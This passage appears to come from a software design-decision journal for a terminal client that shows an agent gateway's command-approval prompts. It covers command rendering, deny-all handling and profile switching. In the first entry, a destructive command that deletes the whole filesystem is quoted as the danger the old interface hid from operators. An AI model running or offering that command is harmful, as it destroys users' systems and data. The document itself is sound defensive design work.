**Decision.** `command` is a field on `PendingPrompt` and `PromptRow` in its own right, never folded into `summary`. The card renders it as a wrapped body between the header and the choice buttons: hard-wrapped by cell to the panel's `content_size.width`, capped at `COMMAND_PREVIEW_LINES` rows, with anything beyond replaced by a counted marker (`… +N more lines`). Newlines in the command are honoured before the wrap. The prompt's arrival transcript entry carries the whole command on its own line, unclipped; the answered entry names the choice **and** the command, bounded by the ordinary system-line clip.

**Rejected alternatives.** *Keep `description or command` as one summary line* — the shipped behaviour, and the defect: at Hermes `7f4d15515` the gateway populates `description` with the joined pattern warnings (`tools/approval.py:3616`) and sends the command in a separate field (`:3651-3660`), so the operator read "recursive delete outside the workspace" above four buttons and never saw `rm -rf / --no-preserve-root`. *Truncate with an ellipsis and no count* — a clipped row is indistinguishable from a row that ended, and the clause that makes a command dangerous is usually at the end. *Word-wrap* — whitespace is syntax in a shell command, and a wrap free to move it can make two tokens read as one. *Soft-wrap and let the container clip* — the card would be honest and its container would not, which is the same failure one level up. *Put the command only in the transcript* — the transcript scrolls; the decision does not.

**Rationale.** The shipping terminal UI reaches the same conclusion with the reason in a comment: "the full command must be reviewable before approving" (`ui-tui/src/components/prompts.tsx:97-99`), with its own `… +N more lines` marker. The audit half is the other side of the same argument — an approval that cannot be reconstructed afterwards is only half the problem solved, and "did I allow that" is not answered by a choice alone.

**Cost, stated plainly.** An approval card is now up to eleven rows instead of four, which it takes from the transcript, and `PromptRegion` becomes a `VerticalScroll` so two queued approvals stay reachable. `CommandPanel` re-wraps on `Resize`, so the rows are a function of terminal width and a test that asserts them must name a size.

**Revisit when.** The gateway starts sending a structured command (argv rather than a string), which would allow per-argument rendering; or a terminal-height budget makes a fixed six-row preview the wrong shape and it should scale with the space available.

### `outstanding_approvals` means the gateway's queue, and deny-all separates what it takes from what it counts

**Author.** v0.1 milestone-2, unit U8 (blocking prompts), closing an adversarial review's safety finding

**Decision.** `SessionState.outstanding_approvals` searches `prompts` **and** `answering`, ordered by frame `seq`. Both consumers of the sole-outstanding-approval rule — the refusal in `respond_to_prompt` and the unanswerable marking in `prompt_view` — read it unchanged and therefore agree. `respond_to_all_approvals` returns a `DenyAllScope` with two members: `taken`, the approvals this call moved out of the registry and may restore or settle, and `already_in_flight`, the approvals another call owns. `scope.total` is what the operator is told.

**Rejected alternatives.** *Leave `outstanding_approvals` reading `prompts` and give each consumer its own predicate* — three copies of one safety rule, and the reason there were two consumers in the first place was to keep the card and the registry from disagreeing. *Merge by concatenating the two tuples* — `answering` holds what was answered most recently, which is routinely older than what is still on screen, and the order is a claim about which command an answer would reach. *Have deny-all take the in-flight approvals too* — two owners for one prompt means either a double settle or a control resurrected while its own answer is travelling. *Report `len(taken)`* — the gateway's `all: true` resolves every queue entry, so the count would understate a safety action by exactly the approvals the operator can least afford to lose track of. *Refuse deny-all while any answer is in flight* — leaves the operator with no action at all for the length of a round trip, in the state the rule exists to get them out of.

**Rationale.** "Outstanding" is a statement about the peer's queue, not about the client's screen. `respond_to_prompt` empties `prompts` before the call goes out, so a client-side container is empty for exactly as long as the peer is still holding the entry — which is the whole window the rule has to cover. Reading the screen made the approval the operator had *just answered* invisible to the rule that exists to stop a second one being answered, and `_spawn_live` runs each respond as its own task, so that window is one the operator is looking at a live interface in.

**Cost, stated plainly.** `outstanding_approvals` now sorts, so it is O(n log n) on a set that is one or two entries in practice. Deny-all's return type is a small dataclass instead of a tuple, which every caller must destructure knowingly.

**Residual risk, stated rather than papered over.** With one answer in flight and deny-all pressed, two `approval.respond` calls are legitimately on the wire, and which the gateway applies first is its own FIFO's business. The count is honest about what the `all` reached; nothing client-side can make the interleaving deterministic. This is the same residual the missing request id causes and it closes the same way.

**Revisit when.** `approval.request` carries a correlating identifier, which retires the sole-outstanding rule and both of its consumers.

### One function decides what an answered prompt may claim, and both answer paths go through it

**Author.** v0.1 milestone-2, unit U8 (blocking prompts), closing an adversarial review's honesty finding

**Decision.** `read_answer(kind, outcome)` returns an `AnswerVerdict` — one of `error`, `not_sent`, `discarded`, `used`, plus the operator-facing reason and whether the control may go back. `_record_prompt_outcome` (one prompt) and `deny_all_approvals_live` (the whole queue) both switch on it. Neither reads `outcome.status`, `delivery_of`, or `gateway_refusal` directly.

**Rejected alternatives.** *Leave the two paths independent and fix deny-all in place* — a second correct copy, which is the arrangement that produced the defect. *Put the verdict in the domain* — it combines a transport outcome with a gateway reply body, and `gateway_refusal` and `delivery_of` already live at the UI boundary; moving all three would pull `RpcOutcome` into the domain core for no gain. *Keep the resolved count in every deny-all line* — an unacknowledged call carries no count, and the clause pushes the delivery note past `SYSTEM_LINE_CLIP`, which is where the reason lives.

**Correction, 2026-08-04.** Half of that last alternative's reasoning has since evaporated, and the decision should not be read as still resting on it. `SYSTEM_LINE_CLIP` no longer exists: it was split into `DETAIL_LINE_CLIP` (120) and `TRANSCRIPT_LINE_CLIP` (2000) once a live gateway showed the 120-character bound was Hermes's clip on a *one-row activity region*, wrongly generalized to Talaria's scrolling transcript. The deny-all line is nowhere near the new bound, so nothing is pushed past anything. **The alternative stays rejected on the other ground**, which was always the stronger one and does not depend on a length: an unacknowledged call carries no count, so the clause would tell the operator nothing.

**Rationale.** Three independent signals decide what a respond may be written down as: the JSON-RPC envelope, U7's delivery table, and the reply body (both ways this gateway discards an answer come back as successes). Deny-all read none of them, and it is the *only* action the interface offers once two approvals queue — so the design funnelled the safety-critical case into the one path that had never been hardened. This journal already carries the rule from a redaction defect of the same shape: a sanitizer attached to one selection rule is not a boundary.

`UNCOUNTED_RESOLUTION` exists for the third symptom: formatting a missing `resolved` count put Python's `None` in front of the operator, and "None resolved" reads in English as "none resolved" — the opposite of "the gateway did not say".

**Cost, stated plainly.** A dataclass and a function in `talaria/ui/app.py` that a reader must follow to see what a branch does, instead of four visible branches per path. Bought back by twenty-two mutations, five of which classify an outcome differently and turn both paths red at once.

**Revisit when.** A third answer path appears (a bulk answer for another bridge), or the gateway starts distinguishing "discarded" in the envelope rather than the body, which would collapse `gateway_refusal` into `delivery_of`.

### A profile's gateway address comes from Talaria's own config, because Hermes does not publish one

**Author.** v0.1 model-picker plan, unit U4 (the profile picker)

**Decision.** `GET /api/profiles` is treated as a *name and liveness* directory only. The endpoint each profile is dialled at comes from a new `[profiles.endpoints]` table in Talaria's `config.toml`, read by `config.profile_endpoints`. A profile is dialable only when the gateway's own `gateway_running` is true **and** Talaria has a configured address for it, and the picker marks those two failures with two different messages because they have two different fixes: start the gateway, or add a line to the config file.

**Evidence.** Measured against the running gateway on 2026-08-06, not read alone. `GET /api/profiles` answered with 37 rows carrying exactly fourteen keys — `description`, `description_auto`, `distribution_name`, `distribution_source`, `distribution_version`, `gateway_running`, `has_alias`, `has_env`, `is_default`, `model`, `name`, `path`, `provider`, `skill_count`. None of them is a URL, a host, or a port. Hermes's own row builder (`_profile_to_dict`, `hermes_cli/web_server.py`) sets exactly that set. The one location-shaped key, `path`, is a filesystem directory; a profile's `gateway_state.json` under it records a pid and no port either.

**Rejected alternatives.** *Derive a port from the profile directory* — makes Talaria depend on Hermes's on-disk layout, which ADR-0001 (Talaria is a client of a gateway it did not launch) and this repository's standing preference for transport interfaces over Hermes internals both refuse; and the port is not recorded there anyway, so the derivation would have to be a guess. *Probe a range of loopback ports and match profiles by asking each* — turns opening a picker into a port scan and would still need a rule for two gateways answering. *Refuse to ship the profile picker until Hermes publishes an endpoint* — the useful half (see which profiles exist and which are live) works today, and the configuration file is a route the operator already has.

**Cost, stated plainly.** An operator with several profiles must write their addresses down once. That is real setup friction and there is no way to remove it that does not invent an address.

**Revisit when.** Hermes publishes a per-profile endpoint on `GET /api/profiles`, or anywhere else; at that point the configured map becomes an override rather than the only source.

### The profile picker reconnects and never writes; `POST /api/profiles/active` has no code path

**Author.** v0.1 model-picker plan, unit U4 (KTD5)

**Decision.** Switching profile means dialling a different gateway. Talaria never calls `POST /api/profiles/active`. There is no constant for that path in `talaria/transport/admin.py`, no method that could reach it, and two tests assert the absence structurally rather than trusting review — `tests/transport/test_admin.py` scans the admin module with docstrings and comments stripped by `ast`, and `tests/transport/test_profile_switch.py` does the same to `talaria/transport/source.py`, which is where an implementer would most plausibly reach for "and tell the gateway".

**Evidence.** Hermes's own handler says it: `set_active_profile_endpoint` in `hermes_cli/web_routers/profiles.py` documents that the write "does not retarget the already-running dashboard process — it changes which profile subsequent CLI commands and gateways use."

**Rejected alternatives.** *Call the POST as well as reconnecting, to keep the machine consistent* — it changes a sticky preference for every later CLI invocation on that machine as a side effect of one operator switching view in one client, which is a larger blast radius than the act they asked for.

**Cost.** A test that scans source text is a test that can be defeated by an indirection. It is a backstop for a decision, not a proof, and is written as one.

**Revisit when.** Hermes grows an endpoint that retargets a running dashboard, which would make the write and the switch the same act.

### A failed profile switch names its state instead of restoring the old connection

**Author.** v0.1 model-picker plan, unit U4

**Decision.** `LiveSource.switch_to_endpoint` returns a `SwitchReport` — a reason, the transport state left behind, and a detail. Refusals decidable without a socket (closed source, no per-endpoint credential resolver, an endpoint that will not parse) happen *before* the existing connection is touched, so they cost the operator nothing; `SwitchReport.left_disconnected` is what separates those from the three that drop the old connection first (`credential_unavailable`, `auth_failed`, `connect_failed`). A switch that fails after dropping does **not** re-dial the previous endpoint.

**Rejected alternatives.** *Roll back to the previous gateway on failure* — the rollback is a second dial that can fail on its own, turning one legible failure into two, and it silently undoes what the operator asked for. *Report the failure as `auth_failed` whenever no connection results* — collapses "this machine could not produce a credential" into "that gateway refused one", which sends the operator to rotate a token that was never presented to anything; the transport already draws that distinction for the initial dial (`credential_unavailable`) and the switch reuses it rather than inventing a parallel vocabulary.

**Cost.** The operator can be left disconnected with nothing dialled. That is a real state and the decision is to *name* it, not to prevent it: the alternative hides the same state behind a second failure.

**Revisit when.** The transport grows a way to hold two connections at once, which would let the new one be proved before the old one is dropped.
